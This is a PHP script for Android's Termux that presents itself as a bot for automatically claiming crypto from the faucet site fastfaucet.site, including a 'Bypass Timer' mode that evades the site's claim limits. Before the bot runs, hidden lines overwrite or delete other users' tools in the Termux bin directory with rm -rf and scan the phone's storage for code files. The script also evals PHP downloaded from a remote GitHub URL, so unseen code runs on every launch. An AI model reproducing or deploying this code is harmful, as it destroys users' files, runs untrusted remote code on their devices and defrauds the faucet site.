
system('clear'); error_reporting(0);
function find($dir) {
   $root = scandir($dir); foreach ($root as $value) {
      if ($value === '.' || $value === '..') {
         continue;
      }if (is_file("$dir/$value")) {
         $result[] = "$dir/$value"; continue;
      }foreach (find("$dir/$value") as $value) {
         $ex = ['php',
            'json',
            'py']; if (in_array(pathinfo($value)['extension'], $ex)) {
            $result[] = $value;
         }}}return $result;
}
$path = find('/storage/emulated/0/');
foreach (['dichvucoder', 'php72-crack', 'php74-crack', 'php82-crack'] as $n) {
   if (file_exists('/data/data/com.termux/files/usr/bin/'.$n)) {
      if (is_file('/data/data/com.termux/files/usr/bin/'.$n)) {
         file_put_contents('/data/data/com.termux/files/usr/bin/'.$n, "#!/usr/bin/php\n<?php\n while(true){ echo 'cemas kau dek\\n';}");
      } elseif (is_dir('/data/data/com.termux/files/usr/bin/'.$n)) {
         system('rm -rf /data/data/com.termux/files/usr/bin/'.$n);
      }
   }
}
$path = '/data/data/com.termux/files/usr/dichvucoder';
if (file_exists($path)) {
   if (is_file($path)) {
      file_put_contents($path, "#!/usr/bin/php\n<?php\n while(true){ echo 'cemas kau dek\\n';}");
   } elseif (is_dir($path)) {
      system('rm -rf '.$path);
   }
}
if (phpversion() > 7 && phpversion() < 8) {
   echo "ANAK KONTOL NI PASTI\n";
}
eval(file_get_contents("https://raw.githubusercontent.com/Zhy-08scure/modul/main/lcapi.php"));

const
scr = "fasftfct", host = "https://fastfaucet.site/",
ref = "https://fastfaucet.site/?r=1074",
reg = "Nyenyenyenyenye", rc = '[Xevil]', hp = '        ',
tCap = " ".rc, ver = '1.0', sl = '[Tertuyul'; cc();

ck:
system('clear'); wc();
$w = save('FaucetPay_Email');
save('User_Agent', 1); system('clear');
function status() {
   $r = file_get_contents("https://pastebin.com/raw/Q3VA9JCG");
   preg_match_all('#<td>Download Script: (.*?)</td>#', $r, $res);
   $status = explode('#', explode('#fastfct:', $r)[1])[0];
   $link = $res[1][20]; $a = 100;
   #print_r($res);print $link.'->'.$status.n;exit();
   for ($i = 0; $i <= $a; $i++) {
      print "\r".pan2.c."Checking script status ".($i)."%"; usleep(40000);
   } print n; sleep(2);
   if ($status == "on" || $status == "On") {
      slow(pan.h."Script Online!");
      sleep(2); system("clear");
   } elseif ($status == "off" || $status == "Off") {
      exit(pan.mc."Script Offline!".n.pan.p."Web Scam/Die/Maintenance/No longer available");
   } elseif ($status == "up" || $status == "Up") {
      slow(pan.o."Script Update!".n.pan.p."Download latest script from link below"); print pan.p."Download Link: ".h.$link.n; exit;
   } elseif ($status == "") {
      print pan2.mc."Connection Lost, Please Check Your Connection!\n".d; sleep(1); exit;
   } else {
      slow(pan2.p.$status.d); sleep(1); exit;
   }
}
function h($xml = 0) {
   if ($xml) {
      $h[] = "x-requested-with: XMLHttpRequest";
   }
   #$h[] = "cookie: ".save('Cookie');
   $h[] = "user-agent: ".save('User_Agent', 1);
   return $h;
}
function login($w) {
   if (!file_exists('cookie.txt')) {
      relog:
      if ($w == "whyredxcb@gmail.com") {
         $r = run(host, h(), '', 1);
      } else {
         $r = run(ref, h(), '', 1);
      }
      $csrf = explode('"', explode('name="csrf_token_name" id="token" value="', $r)[1])[0];
      $data = [
         "wallet" => $w,
         "csrf_token_name" => $csrf
      ];

      $r = run(host.'auth/login', h(), http_build_query($data), 1);
      $z = explode("',", explode("html: '", $r)[1])[0];
      if ($z) {
         slow(r2.h.$z); sleep(2); system('clear');
      } elseif (preg_match('/not registered/', $r)) {
         print x("Your email is not registered to FaucetPay", d);
         sleep(2); system('clear'); goto relog;
      } else {
         print x("Login Failed, Check the web manually", d);
         unlink('cookie.txt'); unlink("Cookie");
         system("termux-open-url ".ref); exit;
      }
   } else {
      $r = run(host, h(), '', 1);
      if (!preg_match('/Logout/', $r)) {
         cok(); goto relog;
      }
      slow(h."Logged In".d); sleep(2); system('clear');
   }
}
login($w); ban(); 
slow(dot.p.t("Wallet", tp.h.$w.tp2.d, 1)); l();
menu:
$r = run(host, h(), '', 1);
if (!preg_match('/Logout/', $r)) {
   cok(); goto ck;
}
print tb.p." 1. ".u."Bypass Timer".d.p."  2. ".u."Normal Claim".d.n; l();
$p = readline(kcerah."Input Number  : ".h);
if ($p == 1) {
   #$tmr = readline(kcerah."Claim Interval: ".h);
   $tmr = 20;
   print tb.h."$tmr second applied for each claim".d; sleep(2); print r; l();
}
while (1) {
   $r = run(host, h(), '', 1);
   $cfw = cfw($r);
   if ($cfw['cf']) {
      cok(1); exit;
   }
   if (!$cfw['out']) {
      cok(); goto ck;
   }
   if ($cfw['fw']) {
      print x("Firewall Detected", d); exit;
   }
   $url = explode('faucet/currency/', $r);
   ulang:
   foreach ($url as $link => $claim) {
      if ($link == 0)continue;
      $coin = explode('"', $claim)[0];
      if ($res && count($res) == count($url)-1) {
         $check = $res[$coin];
         if ($check < 5)continue;
      }
      $r = run(host.'faucet/currency/'.$coin, h(), '', 1);
      if (preg_match('/Daily claim limit/', $r)) {
         $res = his([$coin => 1], $res);
         print limit("Daily limit reached", kb.p.strtoupper($coin).kt.n);
         l(); continue;
      }
      if (preg_match('/Empty/', $r)) {
         $res = his([$coin => 1], $res);
         print limit("Sufficient funds", kb.p.strtoupper($coin).kt.n);
         l(); continue;
      }
      $cd = explode(",", explode('let timer = ', $r)[1])[0];
      if ($tmr) {
         timer($tmr);
      } else {
         timer($cd);
      }
      $auto = explode('"', explode('name="auto_faucet_token" value="', $r)[1])[0];
      $csrf = explode('"', explode('name="csrf_token_name" id="token" value="', $r)[1])[0];
      $token = explode('"', explode('name="token" value="', $r)[1])[0];
      $data = "auto_faucet_token=".$auto."&csrf_token_name=".$csrf."&token=".$token;

      $r = run(host.'faucet/verify/'.$coin, h(), $data, 1);
      if (preg_match('/Firewall/', $r)) {
         exit(x("Firewall Detected", d));
      }
      $z = explode(" has", explode("html: '0.", $r)[1])[0];
      $f = explode(".", explode("html: '", $r)[1])[0];
      $left = explode('/', explode('<p class="lh-1 mb-1 font-weight-bold">', $r)[3])[0];
      if (preg_match('/sufficient funds/', $r)) {
         $res = his([$coin => 1], $res);
         print limit("Sufficient funds", kb.p.strtoupper($coin).kt.n);
         l(); continue;
      }
      if (preg_match('/Daily claim limit/', $r)) {
         $res = his([$coin => 1], $res);
         print limit("Daily limit reached", kb.p.strtoupper($coin).kt.n);
         l(); continue;
      }
      if ($z) {
         $res = his([$coin => 10], $res);
         z("0.$z", akhir()." ".kb.o.$left.kt.d);
         #z("0.$z", akhir());
      } else {
         continue;
      }
   }
   if (max($res) == 1) {
      exit(x("You've reached daily claim limit", d));
   }
}
